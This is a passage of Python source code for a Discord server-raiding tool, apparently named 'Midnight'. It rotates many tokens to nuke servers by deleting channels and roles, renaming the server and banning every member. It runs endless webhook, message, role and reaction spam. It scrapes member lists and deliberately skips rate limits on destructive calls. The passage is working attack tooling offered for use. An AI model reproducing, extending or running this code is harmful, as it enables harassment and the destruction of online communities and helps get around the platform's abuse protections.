            channels = [c['id'] for c in r.json() if c['type'] == 0]

        if not channels:
            self.update_signal.emit("[⚠️] No channels to target for webhook spam!")
            return

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            self.update_signal.emit(
                f"[⚡] Creating {webhook_count} webhooks in each of the {len(channels)} channels...")

            creation_tasks = []
            for channel_id in channels:
                for i in range(webhook_count):
                    task = executor.submit(self.create_webhook, self.get_next_token(), channel_id, f"midnight-spam-{i}")
                    creation_tasks.append(task)

            all_webhooks = []
            for future in as_completed(creation_tasks):
                if not self.running: break
                result_url = future.result()
                if result_url:
                    all_webhooks.append(result_url)

            if not self.running: return
            if not all_webhooks:
                self.update_signal.emit("[❌] Failed to create any webhooks! Aborting.")
                return

            self.update_signal.emit(f"[✅] Successfully created {len(all_webhooks)} webhooks.")
            self.update_signal.emit(
                f"[💬] Unleashing continuous spam from {len(all_webhooks)} webhooks... API DEAD MODE: ON")


            dedicated_msg = getattr(self, 'webhook_message', '').strip()
            if dedicated_msg:
                msg_content = dedicated_msg
            else:
                msg_content = self._get_message_content()

            if not msg_content.strip():
                msg_content = "Midnight" #skibidi


            wave_count = 0
            while self.running:
                wave_count += 1
                self.update_signal.emit(f"--> Firing volley {wave_count}")
                spam_tasks = [executor.submit(self.send_webhook_message, url, msg_content) for url in all_webhooks]

                for _ in as_completed(spam_tasks):
                    if not self.running: break

        self.update_signal.emit("[💀] WEBHOOK SPAM COMPLETE")
        
    def run_member_logger(self):
        if not self.running: return
        
        # 1. Initialize
        self.scraped_members = {} 
        print("[CONSOLE] Starting Normal Scan (Drilling Method)...")
        self.update_signal.emit("[1/1] Starting Recursive Query Drill (a, aa, ab...)...")

        # 2. Run Recursive Driller
        # The loop inside here will break when self.running becomes False (Stop button pressed)
        self.fetch_members_recursive(delay=1.0)
            
        results = list(self.scraped_members.values())
        self.update_signal.emit(f"[✅] TOTAL UNIQUE MEMBERS: {len(results)}")
        
        print(f"\n[CONSOLE] ====== FINAL LIST ({len(results)}) ======")
        for m in results:
             print(f"[CONSOLE] ID: {m.get('id')} | User: {m.get('username')}")
        print("[CONSOLE] ========================================\n")
        
        # --- MODIFIED BLOCK START ---
        # We now emit the signal even if self.running is False, provided we have results.
        if results:
            if not self.running:
                self.update_signal.emit(f"[🛑] Scan stopped by user. Preparing to save {len(results)} members found so far...")
            self.members_fetched_signal.emit(results)
        else:
            self.update_signal.emit("[❌] No members found.")
        # --- MODIFIED BLOCK END ---



    def run_super_scan_members(self):
        if not self.running: return
        
        # 1. Initialize
        self.scraped_members = {}
        
        self.update_signal.emit("[‼️] SUPER SCAN: Starting Optimized List Scrape (Opcode 14)...")
        
        # 2. Run the Upgraded Chunk Fetcher
        # The loop inside here will break when self.running becomes False (Stop button pressed)
        self.fetch_members_via_chunks(delay=0.3)
        
        results = list(self.scraped_members.values())
        self.update_signal.emit(f"[✅] Super Scan Finished. Total: {len(results)}")
        
        # Console Dump
        print(f"\n[CONSOLE] ====== SUPER SCAN RESULTS ({len(results)}) ======")
        for m in results:
             print(f"[CONSOLE] ID: {m.get('id')} | User: {m.get('username')}")
        print("[CONSOLE] =================================================\n")
        
        # --- MODIFIED BLOCK START ---
        # We now emit the signal even if self.running is False, provided we have results.
        if results:
            if not self.running:
                self.update_signal.emit(f"[🛑] Scan stopped by user. Preparing to save {len(results)} members found so far...")
            self.members_fetched_signal.emit(results)
        else:
            self.update_signal.emit("[❌] No members found.")
        # --- MODIFIED BLOCK END ---



    def run_ban_from_log(self):
        if not self.running: return
        self.update_signal.emit("[🔍] Banning from log file. First, fetching current server members...")

        ids_from_file = set(getattr(self, 'ban_user_ids_from_file', []))
        if not ids_from_file:
            self.update_signal.emit("[⚠️] No user IDs loaded or provided to ban.")
            return

        current_members_data = self.fetch_members_via_chunks(delay=0.1)
        current_member_ids = {member['id'] for member in current_members_data}

        if not self.running: return

        if not current_member_ids:
            self.update_signal.emit("[❌] Could not fetch current members from the server. Aborting.")
            return

        ids_to_ban = ids_from_file.intersection(current_member_ids)

        if not ids_to_ban:
            self.update_signal.emit(
                "[✅] No members from the provided list were found in the current server. Nothing to do.")
            return

        self.update_signal.emit(f"[🔨] Found {len(ids_to_ban)} members from the list to ban. Starting...")

        banned_count = 0
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.ban_member, self.get_next_token(), member_id): member_id for member_id in
                       ids_to_ban}

            for i, future in enumerate(as_completed(futures)):
                if not self.running: break
                if future.result():
                    banned_count += 1
                self.progress_signal.emit(int(((i + 1) / len(ids_to_ban)) * 100),
                                          f"Banning {banned_count}/{len(ids_to_ban)}")

        self.update_signal.emit(f"[✅] Banning phase complete. Banned {banned_count}/{len(ids_to_ban)} members.")

        


    def run_infinite_nuke(self):
        while self.running:
            self.run_nuke()
            if not self.running:
                break
            self.update_signal.emit("[♾️] RESTARTING NUKE CYCLE")
            time.sleep(1)

    def run_infinite_nuclear(self):
        while self.running:
            self.run_nuclear()
            if not self.running:
                break
            self.update_signal.emit("[♾️] RESTARTING NUCLEAR CYCLE")
            time.sleep(1)



    def run_rainbow_message(self):
        """
        Sends a message and then rapidly edits it to have a rainbow color effect using ANSI codes.
        This is a single-shot action triggered by a command.
        """
        if not self.running: return

        params = getattr(self, 'single_action_details', {}).get('params', {})
        if not params:
            self.update_signal.emit("[❌] Rainbow Message failed: Could not find action parameters.")
            return

        channel_id = params.get('channel_id')
        command_message_id = params.get('command_message_id')
        
        user_message = params.get('message') or "Rainbow"

        if not all([channel_id, command_message_id, user_message]):
            self.update_signal.emit("[❌] Rainbow Message failed: Missing critical context (channel, message ID, or text).")
            return

        token = self.get_next_token()
        self.update_signal.emit(f"[🌈] Creating rainbow message: '{user_message}'")

        colors = [31, 32, 33, 34, 35, 36]
        rainbow_text = ""
        for i, char in enumerate(user_message):
            if char.isspace():
                rainbow_text += char
                continue
            color_code = colors[i % len(colors)]
            rainbow_text += f"\u001b[2;{color_code}m{char}\u001b[0m"

        final_content = f"```ansi\n{rainbow_text}\n```"
        endpoint = f"{self.base_url}/channels/{channel_id}/messages/{command_message_id}"
        payload = {"content": final_content}

        r = self.make_request("PATCH", endpoint, token, payload)
        if r and r.status_code == 200:
            self.update_signal.emit(f"[✅] Successfully edited message to rainbow.")
        else:
            self.update_signal.emit(f"[❌] Failed to edit message for rainbow effect.")

    def run_colorswap_message(self):
        """
        Sends a message and then edits it back and forth between multiple colors.
        """
        if not self.running: return

        params = getattr(self, 'single_action_details', {}).get('params', {})
        if not params:
            self.update_signal.emit("[❌] Color Swap failed: Could not find action parameters.")
            return

        channel_id = params.get('channel_id')
        command_message_id = params.get('command_message_id')

        user_message = params.get('message') or "ColorSwap"

        if not all([channel_id, command_message_id, user_message]):
            self.update_signal.emit("[❌] Color Swap failed: Missing critical context (channel, message ID, or text).")
            return

        token = self.get_next_token()
        self.update_signal.emit(f"[🎨] Starting color swap for: '{user_message}'")
        endpoint = f"{self.base_url}/channels/{channel_id}/messages/{command_message_id}"
        swap_colors = [31, 32, 33, 34, 35, 36]
        i = 0
        while self.running:
            color_code = swap_colors[i % len(swap_colors)]
            ansi_text = f"\u001b[2;{color_code}m{user_message}\u001b[0m"
            final_content = f"```ansi\n{ansi_text}\n```"

            payload = {"content": final_content}
            self.make_request("PATCH", endpoint, token, payload)

            end_time = time.time() + 0.7
            while self.running and time.time() < end_time:
                time.sleep(0.1)

            i += 1

        self.update_signal.emit("[✅] Color swap effect stopped.")

    def run_colorful_swap_message(self):
        """
        Continuously edits a message, assigning a new random rainbow color to each letter
        in every frame of the animation.
        """
        if not self.running: return

        params = getattr(self, 'single_action_details', {}).get('params', {})
        if not params:
            self.update_signal.emit("[❌] Colorful Swap failed: Could not find action parameters.")
            return

        channel_id = params.get('channel_id')
        command_message_id = params.get('command_message_id')
        

        user_message = params.get('message') or "Colorful"

        if not all([channel_id, command_message_id, user_message]):
            self.update_signal.emit("[❌] Colorful Swap failed: Missing critical context (channel, message ID, or text).")
            return

        token = self.get_next_token()
        self.update_signal.emit(f"[🎨] Starting colorful swap for: '{user_message}'")

        endpoint = f"{self.base_url}/channels/{channel_id}/messages/{command_message_id}"
        colors = [31, 32, 33, 34, 35, 36]

        while self.running:
            colorful_text = ""
            for char in user_message:
                if char.isspace():
                    colorful_text += char
                    continue
                random_color_code = random.choice(colors)
                colorful_text += f"\u001b[2;{random_color_code}m{char}\u001b[0m"

            final_content = f"```ansi\n{colorful_text}\n```"

            payload = {"content": final_content}
            self.make_request("PATCH", endpoint, token, payload)

            end_time = time.time() + 0.7
            while self.running and time.time() < end_time:
                time.sleep(0.1)

        self.update_signal.emit("[✅] Colorful swap effect stopped.")


    def run_single_action(self):
        if not hasattr(self, 'single_action_details') or not self.single_action_details:
            self.update_signal.emit("[❌] No single action was specified for execution.")
            return

        action_type = self.single_action_details.get("type")
        params = self.single_action_details.get("params", {})
        self.update_signal.emit(f"[▶️] Executing single action: {action_type}")

        success = False
        if action_type == "send_message":
            token = self.get_next_token()
            msg = params.get('message', 'Default message')
            target_channel_id = params.get('channel_id', None)
            if not target_channel_id:
                self.update_signal.emit("[❌] No channel ID provided to send message.")
            else:
                success = self.send_specific_message(token, target_channel_id, msg)

        elif action_type == "ban_member":
            token = self.get_next_token()
            user_id_to_ban = params.get('replied_user_id')
            target_server_id = params.get('server_id', None)
            if not target_server_id:
                self.update_signal.emit("[❌] No server ID context for banning.")
            elif not user_id_to_ban:
                self.update_signal.emit("[❌] No user ID to ban. (Hint: Reply to a user's message).")
            else:
                success = self.ban_member(token, user_id_to_ban)

        elif action_type == "rainbow_message":
            self.run_rainbow_message()
            success = True

        elif action_type == "colorswap_message":
            self.run_colorswap_message()
            success = True

        elif action_type == "colorful_swap":
            self.run_colorful_swap_message()
            success = True

        else:
            self.update_signal.emit(f"[⚠️] Single action '{action_type}' is not implemented in run_single_action.")

        if success:
            self.update_signal.emit(f"[✅] Single action '{action_type}' completed successfully.")
        else:
            self.update_signal.emit(f"[❌] Single action '{action_type}' failed or was not successfully executed.")

    def run_ban_all_server(self):
        if not self.running: return
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            self._ban_all_members(executor)

    def run_ping_all_server(self):
        if not self.running: return
        self.update_signal.emit("[📨] Initiating PING ALL. Scanning server for members first...")

        all_member_data = self.fetch_members_via_chunks(delay=0.1)
        if not all_member_data or not self.running:
            self.update_signal.emit("[❌] Failed to fetch members for ping all. Aborting.")
            return
        
        # Instead of setting an attribute that might be copied, we just use the fetched data directly
        ping_ids_from_scan = [member['id'] for member in all_member_data]
        if not ping_ids_from_scan:
            self.update_signal.emit("[✅] No members found to ping.")
            return

        # We manually override the ping_user_ids for this specific run
        setattr(self, 'ping_user_ids', ping_ids_from_scan)
        self.run_ping_all()

class MidnightClientBot(QThread):
    update_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int, str)
    finished = pyqtSignal(QObject, QPushButton)



    def __init__(self, tokens: list, options: dict, initiating_button: QPushButton = None, is_bot_mode: bool = False):
        super().__init__()
        self.tokens = tokens
        self.options = options
        self.guild_found_event = threading.Event()
        self.scraped_members = {}
        self.target_guild_member_count = 0
        self.target_channel_id = None
        self.initiating_button = initiating_button
        self.running = False


        # --- ADD THIS BLOCK ---
        # Create a persistent session to reuse TCP connections
        self.session = requests.Session()
        # Increase pool size so threads don't block waiting for connections
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        # ----------------------

        


        if options.get('use_single_thread', False):
            self.max_threads = 1     # Single Thread Mode
        elif options.get('use_custom_threads', False):
            self.max_threads = options.get('custom_thread_count', 50) # <--- ADDED
        elif options.get('use_low_threads', False):
            self.max_threads = 12    # Potato Mode
        elif options.get('use_high_threads', False):
            self.max_threads = 500   # High Thread Count
        else:
            self.max_threads = 150   # Standard Default

        self.current_mode = options.get("current_mode", "idle")
        
        
        self.token_index = 0
        self.base_url = "https://discord.com/api/v10"
        self.is_bot_mode = is_bot_mode

        for key, value in options.items():
            setattr(self, key, value)
            
        self.current_mode = options.get("current_mode", "idle")
        # REMOVED: self.max_threads = 100 <-- This was the bug
        
        self.bot_user_ids = set()
        # ... (rest of the emoji list)
        self.standard_emojis = [
            "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "😊", "😇", "🙂", "🙃", "😉", "😌", "😍", 
            "🥰", "😘", "😗", "😙", "😚", "😋", "😛", "😝", "😜", "🤪", "🤨", "🧐", "🤓", "😎", "🤩", 
            "🥳", "😏", "😒", "😞", "😔", "😟", "😕", "🙁", "☹️", "😣", "😖", "😫", "😩", "🥺", "😢", 
            "😭", "😤", "😠", "😡", "🤬", "🤯", "😳", "🥵", "🥶", "😱", "😨", "😰", "😥", "😓", "🤗", 
            "🤔", "🤭", "🤫", "🤥", "😶", "😐", "😑", "😬", "🙄", "😯", "😦", "😧", "😮", "😲", "🥱", 
            "😴", "🤤", "😪", "😵", "🤐", "🥴", "🤢", "🤮", "🤧", "😷", "🤒", "🤕", "🤑", "🤠", "😈", 
            "👿", "👹", "👺", "🤡", "💩", "👻", "💀", "☠️", "👽", "👾", "🤖", "🎃", "😺", "😸", "😹", 
            "😻", "😼", "😽", "🙀", "😿", "😾", "👋", "🤚", "🖐", "✋", "🖖", "👌", "🤌", "🤏", "✌️", 
            "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", 
            "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦵", "🦿", "🦶", 
            "👣", "👀", "👁", "🧠", "🫀", "🫁", "🦷", "🦴", "👅", "👄", "💋", "💯", "🔥", "💥", "⭐", 
            "✨", "🌟", "💫", "⚡", "☄️", "☀️", "🌈", "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", 
            "🤎", "💔", "💖", "💘", "💝", "💢", "💤", "💦", "💨", "🚀", "🛸", "🌍", "🌕", "🌑", "💎", 
            "🎁", "🎉", "🎊", "🎈", "🎂", "🎄", "🎅", "👼", "👑", "🥇", "🏆", "🎖️", "🎯", "🎱", "🎲", 
            "🎰", "🎮", "🕹️", "💻", "📱", "💡", "💰", "💸", "📈", "📉", "📌", "📍", "📎", "🔗", "🔑", 
            "🔒", "🔓", "🔔", "📣", "📢", "🔊", "🔇", "🎵", "🎶", "🎤", "🎧", "🎷", "🎸", "🎹", "🎻", 
            "🥁", "🎬", "🎭", "🎨", "🎪", "🎟️", "🎫", "✅", "❌", "☢️"
        ]



    def get_next_token(self):
        if not self.tokens: return None
        token = self.tokens[self.token_index]
        self.token_index = (self.token_index + 1) % len(self.tokens)
        return token



    def make_request(self, method, endpoint, token, payload=None, params=None):
        headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        for attempt in range(4):
            if not self.running: return None
            try:
                r = self.session.request(method, endpoint, headers=headers, json=payload, params=params, timeout=15)
                
                if r.status_code == 429:
                    # --- MODIFIED RATE LIMIT HANDLING ---
                    is_ignorable = (
                        ("webhooks" in endpoint and method == "POST") or
                        ("bans" in endpoint and method == "PUT") or
                        ("channels" in endpoint and method == "POST")
                    )

                    if is_ignorable:
                        self.update_signal.emit(f"[⏩-BOT] Skipping long rate limit for {endpoint[-15:]}")
                        return r
                    # ------------------------------------

                    retry_after = r.json().get('retry_after', 2.5)
                    self.update_signal.emit(f"[⏳-BOT] Rate limited. Waiting for {retry_after:.2f}s...")
                    end_time = time.time() + retry_after
                    while self.running and time.time() < end_time:
                        time.sleep(0.1)
                    continue

                if r.status_code >= 400:
                    self.update_signal.emit(f"[❌-BOT] Error {r.status_code} for {endpoint}: {r.text[:150]}")
                    return r
                return r
            except requests.exceptions.RequestException as e:
                self.update_signal.emit(f"[❌-BOT] Request to {endpoint} failed: {e}")
                time.sleep(1)
        return None


    def run(self):
        self.running = True
        try:
            for token in self.tokens:
                r = self.make_request("GET", f"{self.base_url}/users/@me", token)
                if r and r.status_code == 200: self.bot_user_ids.add(r.json()['id'])
            action_map = {"nuke": self.run_nuke, "nuclear": self.run_nuclear, "turbo": self.run_turbo, "create_channels": self.run_create_channels, "role_spammer": self.run_role_spammer, "webhook_spammer": self.run_webhook_spammer, "webhook_spam_existing": self.run_webhook_spam_existing, "webhook_create_only": self.run_webhook_creator, "reaction_spammer": self.run_reaction_spammer, "ban_all_server": self.run_ban_all_server, "ghost_typer": self.run_ghost_typer}
            if self.current_mode in action_map: action_map[self.current_mode]()
            else: self.update_signal.emit(f"[BOT WARNING] Bot mode does not support action: '{self.current_mode}'")
        except Exception as e:
            self.update_signal.emit(f"[❌-BOT] CRITICAL ERROR in {self.current_mode}: {e}")
            traceback.print_exc()
        finally:
            self.running = False
            self.finished.emit(self, self.initiating_button)

    def stop(self): self.running = False
    def _get_message_content(self):
        messages = getattr(self, 'messages', [])
        use_random = getattr(self, 'random_messages', True)
        if not messages: return "Midnight"
        return random.choice(messages) if use_random else '\n'.join(messages)

    def _create_and_spam_channel_worker(self, name):
        token = self.get_next_token()
        new_channel_id = self.create_channel(token, name)
        if new_channel_id and self.running:
            time.sleep(0.1) 
            self.send_message(self.get_next_token(), new_channel_id, self._get_message_content())
        return new_channel_id

    def _send_random_message_worker(self, channel_id):
        if not self.running: return
        self.send_message(self.get_next_token(), channel_id, self._get_message_content())

    def _send_random_webhook_worker(self, url):
        if not self.running: return
        self.send_webhook_message(url, self._get_message_content())

    def create_channel(self, token, name):
        server_id = getattr(self, 'server_id', None)
        if not self.running or not server_id: return None
        r = self.make_request("POST", f"{self.base_url}/guilds/{server_id}/channels", token, {"name": name, "type": 0})
        return r.json()['id'] if r and r.status_code == 201 else None

    def delete_channel(self, token, channel_id):
        if not self.running: return
        self.make_request("DELETE", f"{self.base_url}/channels/{channel_id}", token)
        
    def delete_role(self, token, role_id):
        server_id = getattr(self, 'server_id', None)
        if not self.running or not server_id: return
        self.make_request("DELETE", f"{self.base_url}/guilds/{server_id}/roles/{role_id}", token)

    def send_message(self, token, channel_id, content):
        if not self.running or not content: return
        self.make_request("POST", f"{self.base_url}/channels/{channel_id}/messages", token, {"content": content})
        
    def ban_member(self, token, server_id, user_id):
        if not self.running: return False
        r = self.make_request("PUT", f"{self.base_url}/guilds/{server_id}/bans/{user_id}", token, {'delete_message_seconds': 0})
        return r and r.status_code == 204

    def create_webhook(self, token, channel_id):
        if not self.running: return None
        r = self.make_request("POST", f"{self.base_url}/channels/{channel_id}/webhooks", token, {"name": "Midnight"})
        return r.json()['url'] if r and r.status_code == 200 else None

    def send_webhook_message(self, webhook_url, content):
        if not self.running: return
        try: requests.post(webhook_url, json={"content": content, "allowed_mentions": {"parse": ["everyone"]}}, timeout=5)
        except: pass
        
    def update_server_details(self, token):
        server_id = getattr(self, 'server_id', None)
        if not self.running or not server_id: return
        payload = {}
        custom_name = getattr(self, 'custom_server_name', '').strip()
        if custom_name: payload['name'] = custom_name
        pfp_path = getattr(self, 'server_pfp_path', None)
        if pfp_path and os.path.exists(pfp_path):
            try:
                with open(pfp_path, "rb") as f: encoded = base64.b64encode(f.read()).decode('utf-8')
                ext = os.path.splitext(pfp_path)[1].lstrip('.').lower()
                payload["icon"] = f"data:image/{'jpeg' if ext == 'jpg' else ext};base64,{encoded}"
            except Exception as e: self.update_signal.emit(f"[❌-BOT] Failed to encode PFP: {e}")
        if payload: self.make_request("PATCH", f"{self.base_url}/guilds/{server_id}", token, payload)

    def run_nuke(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        self.update_signal.emit(f"[💣-BOT] INITIATING FULLY CONFIGURABLE BOT NUKE ON {server_id}")
        scan_token = self.get_next_token()
        destruction_options = getattr(self, 'destruction_options', {})

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            if destruction_options.get("delete_channels", True):
                r_channels = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
                if r_channels and r_channels.status_code == 200:
                    self.update_signal.emit(f"[💥-BOT] Deleting {len(r_channels.json())} channels...")
                    for c in r_channels.json(): executor.submit(self.delete_channel, self.get_next_token(), c['id'])

            if destruction_options.get("delete_roles", True):
                bot_id = self.bot_user_ids.copy().pop() if self.bot_user_ids else None
                bot_member_info = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/members/{bot_id}", scan_token) if bot_id else None
                all_roles_res = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", scan_token)
                if bot_member_info and bot_member_info.status_code == 200 and all_roles_res and all_roles_res.status_code == 200:
                    role_map = {r['id']: r for r in all_roles_res.json()}
                    bot_highest_pos = max((role_map.get(r_id, {}).get('position', 0) for r_id in bot_member_info.json().get('roles', [])), default=0)
                    roles_to_delete = [r for r in role_map.values() if not r.get('managed') and r['name'] != '@everyone' and r['position'] < bot_highest_pos]
                    self.update_signal.emit(f"[💀-BOT] Deleting {len(roles_to_delete)} roles below bot...")
                    for r in roles_to_delete: executor.submit(self.delete_role, self.get_next_token(), r['id'])

            if destruction_options.get("rename_server", True): executor.submit(self.update_server_details, self.get_next_token())
            if destruction_options.get("ban_all_enabled", False): executor.submit(self.run_ban_all_server)

            newly_created_channels = []
            channel_name_template = getattr(self, 'custom_channel_name', 'midnight-raid') or 'midnight-raid'
            

            spam_on_create = destruction_options.get("spam_on_create", False)


            def submit_creation_task(name):
                if spam_on_create:
                    return executor.submit(self._create_and_spam_channel_worker, name)
                else:
                    return executor.submit(self.create_channel, self.get_next_token(), name)

            if destruction_options.get("create_6_channels"):
                self.update_signal.emit("[-BOT] Creating 6 channels...")
                futures = [submit_creation_task(f"{channel_name_template}-{i}") for i in range(6)]
                for f in as_completed(futures):
                    if f.result() and not spam_on_create: newly_created_channels.append(f.result())

            elif destruction_options.get("create_spam"):
                duration = getattr(self, 'channel_creation_duration', 10)
                self.update_signal.emit(f"[-BOT] Creating channels for {duration}s...")
                start_time = time.time()
                with ThreadPoolExecutor(max_workers=50) as creation_executor:
                    while self.running and (time.time() - start_time) < duration:
                        futures = {submit_creation_task(f"{channel_name_template}-{random.randint(100,999)}") for _ in range(10)}
                        for f in as_completed(futures):
                             if f.result() and not spam_on_create: newly_created_channels.append(f.result())

            # (Post-creation spam logic remains the same...)
            if not spam_on_create:
                time.sleep(2)
                r_chans = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
                channels_to_spam = newly_created_channels or ([c['id'] for c in r_chans.json() if c['type']==0] if r_chans and r_chans.status_code == 200 else [])
                if destruction_options.get("use_webhook_ping"):
                    urls = {f.result() for f in [executor.submit(self.create_webhook, self.get_next_token(), c_id) for c_id in channels_to_spam] if f.result()}
                    for _ in range(getattr(self, 'post_nuke_spam_count', 5)):
                        if not self.running: break
                        for url in urls: executor.submit(self._send_random_webhook_worker, url)
                if destruction_options.get("spam_all_channels_post_nuke"):
                    for _ in range(getattr(self, 'post_nuke_spam_count', 5)):
                         if not self.running: break
                         for c_id in channels_to_spam: executor.submit(self._send_random_message_worker, c_id)
        self.update_signal.emit("[💀-BOT] BOT NUKE COMPLETE")

    def run_ban_all_server(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        member_queue = queue.Queue(maxsize=2000)
        banned_count = 0
        
        def fetcher():
            last_id = '0'
            while self.running:
                params = {'limit': 1000, 'after': last_id}
                r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/members", self.get_next_token(), params=params)
                if not r or r.status_code != 200: break
                members = r.json()
                if not members: break
                last_id = members[-1]['user']['id']
                for member in members:
                    member_queue.put(member['user']['id'])
            for _ in range(50): member_queue.put(None)
        
        def banner():
            nonlocal banned_count
            while self.running:
                user_id = member_queue.get()
                if user_id is None: break
                if user_id not in self.bot_user_ids:
                    if self.ban_member(self.get_next_token(), server_id, user_id):
                        banned_count += 1
                        self.update_signal.emit(f"Banned {banned_count} members...")
                member_queue.task_done()

        self.update_signal.emit("[🔨-BOT] Starting streamed member ban.")
        fetch_thread = threading.Thread(target=fetcher, daemon=True)
        fetch_thread.start()
        
        banner_threads = [threading.Thread(target=banner, daemon=True) for _ in range(50)]
        for t in banner_threads: t.start()
        for t in banner_threads: t.join()
        
        fetch_thread.join()
        self.update_signal.emit(f"[✅-BOT] Mass ban task finished. Total bans: {banned_count}.")

    def run_create_channels(self):
        duration = getattr(self, 'channel_creation_duration', 10)
        channel_name = getattr(self, 'custom_channel_name', 'midnight-bot-raid')
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=50) as executor:
            while self.running and (time.time() - start_time) < duration:
                 executor.submit(self.create_channel, self.get_next_token(), f"{channel_name}-{random.randint(100,999)}")
        self.update_signal.emit("[✅-BOT] Channel creation complete.")

    def run_nuclear(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", self.get_next_token())
        if not r or r.status_code != 200: return
        channels = [c['id'] for c in r.json() if c['type'] == 0]
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running:
                for cid in channels: executor.submit(self._send_random_message_worker, cid)
                time.sleep(0.75)

    def run_turbo(self):
        channel_id = getattr(self, 'channel_id', None)
        if not channel_id: return
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running:
                executor.submit(self._send_random_message_worker, channel_id)
                time.sleep(0.05)

    def run_ghost_typer(self):
        channel_id = getattr(self, 'channel_id', None)
        if not channel_id: return
        self.update_signal.emit(f"[👻-BOT] Ghost Typer started in channel {channel_id}")
        endpoint = f"{self.base_url}/channels/{channel_id}/typing"
        def worker(token):
            while self.running:
                self.make_request("POST", endpoint, token)
                end_time = time.time() + 8
                while self.running and time.time() < end_time:
                    time.sleep(0.5)
        threads = [threading.Thread(target=worker, args=(token,), daemon=True) for token in self.tokens]
        for t in threads: t.start()
        for t in threads: t.join()

    def create_role(self, token, name="HACKED", color=0xff0000):
        """Creates a new role in the server."""
        server_id = getattr(self, 'server_id', None)
        if not self.running or not server_id: 
            return None
        
        payload = {
            "name": name,
            "color": color,
            "permissions": "0" 
        }
        
        r = self.make_request("POST", f"{self.base_url}/guilds/{server_id}/roles", token, payload)
        
        if r and r.status_code == 200:
            return r.json().get('id')
        return None

    def run_role_spammer(self):
        """Runs the role spammer in bot mode."""
        server_id = getattr(self, 'server_id', None)
        if not server_id:
            self.update_signal.emit("[❌-BOT] Role Spammer failed: No Server ID provided.")
            return

        role_name_template = getattr(self, 'role_name', 'BOT-SPAM') or "BOT-SPAM"
        self.update_signal.emit(f"[🎨-BOT] ROLE SPAMMER ACTIVATED (Server: {server_id})")

        with ThreadPoolExecutor(max_workers=50) as executor:
            while self.running:
                futures = []
                for _ in range(20): # Furry femboy pixelated speaking
                    if not self.running:
                        break
                    
                    name = f"{role_name_template}-{random.randint(100, 9999)}"
                    color = random.randint(0, 0xFFFFFF)
                    
                    # Whats dis again?
                    futures.append(executor.submit(self.create_role, self.get_next_token(), name, color))

                # Waiting is not my thing fine ill do it this time for the batch gng :(
                for future in as_completed(futures):
                    if not self.running:
                        break
                    future.result() # Tis will get the result

                if not self.running:
                    break
    def add_reaction(self, token, channel_id, message_id, emoji):
        """Adds a reaction to a message (for bots)."""
        if not self.running: return False
        # Emojis must be URL-encoded for the API endpoint
        encoded_emoji = requests.utils.quote(emoji.encode('utf-8'))
        endpoint = f"{self.base_url}/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
        # A successful reaction add returns a 204 No Content status
        r = self.make_request("PUT", endpoint, token)
        return r and r.status_code == 204


    def run_reaction_spammer(self):
        channel_id = getattr(self, 'reaction_channel_id', None)
        message_id = getattr(self, 'reaction_message_id', None)
        if not channel_id or not message_id:
            self.update_signal.emit("[❌-BOT] Reaction Spammer failed: Channel/Message ID missing.")
            return
        self.update_signal.emit(f"[❤️-BOT] REACTION SPAMMER ACTIVATED")
        with ThreadPoolExecutor(max_workers=20) as executor:
            while self.running:
                emoji = random.choice(self.standard_emojis)
                # Submit the task and let it run without waiting
                executor.submit(self.add_reaction, self.get_next_token(), channel_id, message_id, emoji)
                # Use a very small sleep to prevent this loop from consuming 100% CPU
                # while still allowing for very fast reaction spamming.
                time.sleep(00000000000000000000000.1)

    def run_webhook_creator(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        webhook_count = getattr(self, 'webhook_spam_count', 10)
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", self.get_next_token())
        if not r or r.status_code != 200: return
        channels = [c['id'] for c in r.json() if c['type'] == 0]
        with ThreadPoolExecutor(max_workers=50) as executor:
            for ch_id in channels:
                for _ in range(webhook_count):
                    executor.submit(self.create_webhook, self.get_next_token(), ch_id)
        self.update_signal.emit("[✅-BOT] Webhook creation complete.")

    def run_webhook_spammer(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        webhook_count = getattr(self, 'webhook_spam_count', 5)
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", self.get_next_token())
        if not r or r.status_code != 200: return
        channels = [c['id'] for c in r.json() if c['type'] == 0]
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.create_webhook, self.get_next_token(), ch_id) for ch_id in channels for _ in range(webhook_count)]
            webhook_urls = [f.result() for f in as_completed(futures) if f.result()]
            if not webhook_urls: return
            self.update_signal.emit(f"[✅-BOT] Created {len(webhook_urls)} webhooks. Starting spam.")
            while self.running:
                for url in webhook_urls: executor.submit(self._send_random_webhook_worker, url)
                time.sleep(1.0)

    def run_webhook_spam_existing(self):
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/webhooks", self.get_next_token())
        if not r or r.status_code != 200: return
